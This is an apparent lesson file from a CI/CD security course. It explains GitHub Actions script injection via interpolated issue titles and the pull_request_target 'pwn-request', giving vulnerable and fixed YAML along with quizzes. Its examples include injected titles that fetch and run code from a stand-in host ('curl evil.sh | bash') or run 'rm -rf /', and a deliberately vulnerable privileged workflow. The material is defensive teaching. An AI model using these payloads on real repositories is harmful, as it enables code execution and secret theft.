@@ -1,0 +1,154 @@
+---
+concepts:
+- ci-cd-gha-injection
+deepensInto: []
+estMin: 17
+lang: en
+lessonType: topic
+level: senior
+order: 3
+prereqs: []
+slug: "03-injection-and-untrusted-input"
+sources:
+- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
+- https://securitylab.github.com/resources/github-actions-untrusted-input/
+spiral: []
+status: ready
+title: "Untrusted input in CI: script injection via interpolated context and the pull_request_target pwn-request"
+track: "ci-cd"
+unit: "10-security-and-oidc"
+summary: "Interpolating attacker-controlled context like github.event.issue.title into a run step is shell injection. pull_request_target runs with secrets and a write token — checking out PR head there is the pwn-request."
+---
+
+import Hook from "~/components/lesson/Hook.astro";
+import Explanation from "~/components/lesson/Explanation.astro";
+import Recap from "~/components/lesson/Recap.astro";
+import Inset from "~/components/lesson/Inset.astro";
+import Crux from "~/components/prose/Crux.astro";
+import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
+import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
+import Quiz from "~/components/pedagogy/Quiz.astro";
+import FlowDiagram from "~/components/diagram/FlowDiagram.astro";
+
+<Hook>
+The "auto-label" workflow looked harmless: on every new issue, echo the title into a label-generator script. It ran on `issues` events, so it had the repo token, and a previous refactor had quietly bumped that token to write. The body of one step was a single line — `run: echo "New issue: ${{ github.event.issue.title }}"`. An attacker opened an issue titled `"; curl -s evil.sh | bash #`. GitHub does not pass that title as an *argument* to the shell — it textually substitutes it into the script *before* the shell parses it, so the runner executed `echo "New issue: "; curl -s evil.sh | bash #"`. The injected command ran with the workflow's environment: the `GITHUB_TOKEN`, every secret the job could see, and write access to the repo. No exploit chain, no zero-day — just attacker text dropped verbatim into a shell, the single most common GitHub Actions vulnerability there is. The fix was not sanitizing the title. It was never interpolating untrusted text into a `run` body at all.
+</Hook>
+
+<Crux>Interpolating attacker-controlled context into a run step is shell injection; pass it via env, and never run untrusted code with secrets.</Crux>
+
+<Explanation>
+
+## Script injection: the `${{ ... }}` that runs as code
+
+GitHub Actions evaluates `${{ ... }}` expressions and substitutes the result into the workflow text *before* the runner's shell sees the step. For a `run:` step, that means an expression is spliced into the shell script as raw text, then the shell parses the whole thing. If the expression's value is attacker-controlled, the attacker is writing shell:
+
+```yaml
+# VULNERABLE — title is textually substituted into the script
+- run: echo "Issue: ${{ github.event.issue.title }}"
+```
+
+An issue title of `$(curl evil.sh | bash)` or `"; rm -rf / #` becomes part of the executed command. The dangerous contexts are everything a non-collaborator can set: `github.event.issue.title`, `.issue.body`, `.pull_request.title`, `.pull_request.body`, `.comment.body`, `.review.body`, head ref and branch names, commit messages and author names from a PR. None of these are trustworthy.
+
+The fix is to break the substitution-into-code path: pass the untrusted value through an **environment variable** and reference it with shell quoting, so it is *data the shell reads*, never *text the shell parses*:
+
+```yaml
+# SAFE — the value arrives as an env var; the shell never parses it as code
+- env:
+    TITLE: ${{ github.event.issue.title }}
+  run: echo "Issue: $TITLE"
+```
+
+Now `$TITLE` is expanded by the shell as the value of a variable; even a title full of `$(...)` and backticks is an inert string. The `env:` binding is the trust boundary: GitHub sets the variable's value out-of-band, and the script body — which is fixed at author time — only references it. (Quote it: `"$TITLE"`.) The same rule covers `actions/github-script` and JS: use `process.env.TITLE` or `context.payload`, never string-concatenate the payload into evaluated code.
+
+<Quiz
+  id="03-injection-and-untrusted-input-quiz-1"
+  lessonSlug="03-injection-and-untrusted-input"
+  lang="en"
+  question="Why does interpolating github.event.issue.title directly into a run echo allow command execution, while passing the title via an env var and echoing the shell variable does not?"
+  choices={[
+    { label: "With ${{ }} the title is textually substituted into the script before the shell parses it, so attacker text becomes shell syntax; via env the value is set out-of-band and $TITLE is read as inert data the shell never re-parses", correct: true },
+    { label: "Both are equally vulnerable; env vars are just a style preference", misconception: "They are not equivalent. ${{ }} interpolation splices the value into the script source where the shell will parse it as code; an env var is assigned by the runner and dereferenced as a string value, so injected $(...) or ; never reach the parser as syntax." },
+    { label: "The env version is safe because GitHub HTML-escapes environment variables", misconception: "There is no HTML escaping involved — it's a shell context, not HTML. Safety comes from the value being passed as data through the environment rather than concatenated into the script text the shell parses." },
+    { label: "${{ }} only runs code when the value contains the literal string 'run:'", misconception: "Any shell metacharacter — $(...), backticks, ;, |, && — in the substituted value can execute. There is no magic trigger string; the whole substituted text is parsed as shell." },
+  ]}
+/>
+
+## The pwn-request: pull_request_target plus PR checkout
+
+There are two PR-triggered events, and the difference is the whole vulnerability. `pull_request` from a fork runs with a **read-only** token and **no secrets** — safe to run untrusted PR code because it can do nothing. `pull_request_target` runs in the context of the **base** repository: it gets the **full secrets** and a **read/write** `GITHUB_TOKEN`, and — critically — it checks out the **base** branch's workflow by default, *not* the PR's. That is deliberate: it lets a fork PR's CI label, comment, or apply automation with privileges, using trusted base-repo workflow code.
+
+The vulnerability — the **pwn-request** — is checking out and running the *PR's* code inside that privileged event:
+
+```yaml
+# VULNERABLE — pwn-request: untrusted PR head run with secrets + write token
+on: pull_request_target
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
+      - run: npm install && npm test                        # runs it with full secrets
+```
+
+`npm install` runs lifecycle scripts; `npm test` runs the PR's test files — all attacker-authored, now executing with the base repo's secrets and write token. An attacker opens a PR from a fork that adds a malicious `postinstall` script, and it exfiltrates every secret and pushes to the repo. The combination is the trap: the privileged event's secrets and write token, *and* checking out untrusted code into it.
+
+The safe patterns: do privileged work in `pull_request_target` only on **trusted, fixed** workflow code (never check out PR head); or split — run untrusted build/test in a `pull_request` job (no secrets), and have a separate, secret-bearing job act on its results without executing PR code. If you must check out PR head under `pull_request_target`, do it without secrets in scope and without the write token, treating it as fully hostile.
+
+<Inset kind="why" lang="en">
+Why does GitHub even offer pull_request_target if it's this dangerous? Because there's a real need it serves: fork PRs from `pull_request` get no secrets and a read-only token by design, which means a fork PR's CI cannot post a status comment, apply a label, or call a secret-gated API. pull_request_target exists to let *trusted base-repo automation* react to a fork PR with privileges — using the base branch's workflow, which the PR author cannot modify. The danger is entirely in the misuse: pulling the PR's *own* code into that privileged context. Used as designed — privileged trusted code, never untrusted checkout — it's safe; the pwn-request is the anti-pattern of combining its privileges with the very untrusted code it was meant to keep at arm's length.
+</Inset>
+
+<Quiz
+  id="03-injection-and-untrusted-input-quiz-2"
+  lessonSlug="03-injection-and-untrusted-input"
+  lang="en"
+  question="A workflow uses on: pull_request_target and checks out github.event.pull_request.head.sha, then runs npm install. Why is this the pwn-request, and what's the minimal correct fix?"
+  choices={[
+    { label: "pull_request_target runs with the base repo's secrets and a write token, and checking out the PR head executes attacker code (npm install lifecycle scripts) with those privileges; the fix is to not check out PR head in this event — run untrusted build/test under pull_request instead", correct: true },
+    { label: "It's fine because pull_request_target sandboxes forked code with no secrets", misconception: "That describes pull_request, not pull_request_target. pull_request_target deliberately carries full secrets and a write token; checking out the PR head there runs untrusted code with exactly those privileges, which is the whole exploit." },
+    { label: "The risk is only the npm registry, so pinning package versions fixes it", misconception: "Version pinning doesn't help — the malicious code is in the PR itself (lifecycle scripts, test files), checked out by head.sha. The fix is not running untrusted PR code in the privileged event at all, not pinning third-party packages." },
+    { label: "Adding permissions: contents: read fully fixes it since the token can't write", misconception: "Dropping the token to read still leaves all repository and organization secrets exposed to the attacker-controlled code, which can exfiltrate them. Least-privilege token helps but the real fix is to not execute PR head under pull_request_target." },
+  ]}
+/>
+
+</Explanation>
+
+<FlowDiagram
+  label="Two paths attacker-controlled input reaches execution, and the boundary that stops each"
+  hue="var(--d-security)"
+  perRow={3}
+  nodes={[
+    { id: "input", label: "Untrusted input", sub: "title/body/PR code" },
+    { id: "interp", label: "Interpolated into run", sub: "${{ }} → shell parses" },
+    { id: "ptarget", label: "pull_request_target", sub: "secrets + write token" },
+    { id: "checkout", label: "Checkout PR head", sub: "runs attacker code" },
+    { id: "env", label: "Pass via env", sub: "inert data, no parse" },
+    { id: "split", label: "Split jobs / no head", sub: "untrusted = no secrets" },
+  ]}
+  edges={[
+    { from: "input", to: "interp", label: "injection" },
+    { from: "input", to: "ptarget", label: "pwn-request" },
+    { from: "ptarget", to: "checkout", label: "if PR head" },
+    { from: "interp", to: "env", label: "fix" },
+    { from: "checkout", to: "split", label: "fix" },
+  ]}
+  caption="Script injection: untrusted context spliced into a run body is parsed as shell — pass it through env so it is inert data. Pwn-request: pull_request_target carries secrets and a write token — never check out PR head into it; run untrusted code under pull_request (no secrets) or in a split job."
+/>
+
+<KeyTakeaway>Two CI-specific injection classes. Script injection: a `${{ github.event.* }}` expression from issues/PRs/comments is substituted into a run body as text before the shell parses it, so attacker input becomes shell code — pass it through an env var and reference $VAR (quoted) so it stays inert data. Pwn-request: pull_request_target runs with the base repo's full secrets and a read/write token and checks out the base branch by default; checking out the PR head (head.sha) there executes attacker code (npm lifecycle scripts, test files) with those privileges. Never run untrusted PR code in pull_request_target — use pull_request (no secrets, read-only) for build/test, or split into a privileged job that never touches PR code.</KeyTakeaway>
+
+<RetrievalDrawer
+  client:visible
+  id="03-injection-and-untrusted-input-retrieval"
+  lang="en"
+  questions={[
+    { q: "Explain the mechanism of GitHub Actions script injection and the env-var fix, and list which contexts are untrusted.", a: "GitHub evaluates ${{ ... }} expressions and substitutes the result into the workflow text before the runner's shell parses the step. In a run step the value is spliced into the shell script as raw source, so if the value is attacker-controlled it is interpreted as shell — an issue title of $(curl evil.sh | bash) or \"; rm -rf / # executes. The fix is to never interpolate untrusted values into a run body: bind them to an env var (env: TITLE: ${{ github.event.issue.title }}) and reference \"$TITLE\" in the script. The runner assigns the variable out-of-band, so the shell dereferences it as inert data and never re-parses metacharacters as syntax. Untrusted contexts are anything a non-collaborator sets: issue/PR title and body, comment and review body, head ref/branch names, and PR commit messages and author names. The same rule applies in github-script: read process.env or context.payload, never concatenate the payload into evaluated code." },
+    { q: "What makes pull_request_target a pwn-request risk, why does it exist, and how do you use it safely?", a: "pull_request from a fork runs with a read-only token and no secrets, so untrusted PR code is harmless. pull_request_target runs in the base repo's context — full secrets, read/write GITHUB_TOKEN — and by default checks out the base branch's trusted workflow, not the PR. It exists so trusted base-repo automation can react to a fork PR with privileges (label, comment, secret-gated API) using code the PR author can't modify. The pwn-request is checking out the PR head (github.event.pull_request.head.sha) under pull_request_target and running it: npm install lifecycle scripts and PR test files then execute with the base repo's secrets and write token, letting an attacker exfiltrate secrets and push. Safe use: only run trusted, fixed workflow code in pull_request_target and never check out PR head; or split — build/test untrusted code under pull_request with no secrets, and have a separate privileged job act on results without running PR code. If PR head must be checked out, do it with no secrets and no write token, treating it as hostile." },
+  ]}
+/>
+
+<Recap lang="en">
+CI runs attacker-reachable input in a privileged environment, and two patterns turn that into code execution. Script injection: GitHub substitutes `${{ ... }}` expressions into the workflow text before the shell parses a run step, so any attacker-controlled context — issue and PR titles and bodies, comment and review bodies, head ref names, PR commit messages and author names — spliced into a run body is parsed as shell, and a title like `$(curl evil.sh | bash)` executes with the job's token and secrets. The fix is not sanitizing the string; it's never interpolating it into code. Bind the value to an env var and reference "$VAR", so the shell reads it as inert data it never re-parses. The pwn-request: pull_request_target runs in the base repo's context with full secrets and a read/write token, and checks out the base branch by default — it exists so trusted base automation can react to fork PRs with privileges. Checking out the PR head into that event runs attacker code (npm lifecycle scripts, test files) with those privileges, exfiltrating secrets and pushing to the repo. Use pull_request (no secrets, read-only) for untrusted build and test; reserve pull_request_target for trusted, fixed workflow code that never checks out PR head, or split into a privileged job that acts on results without executing PR code. Untrusted input plus privilege is the recurring shape — break the path from input to execution, and keep secrets away from code you did not write.
+</Recap>
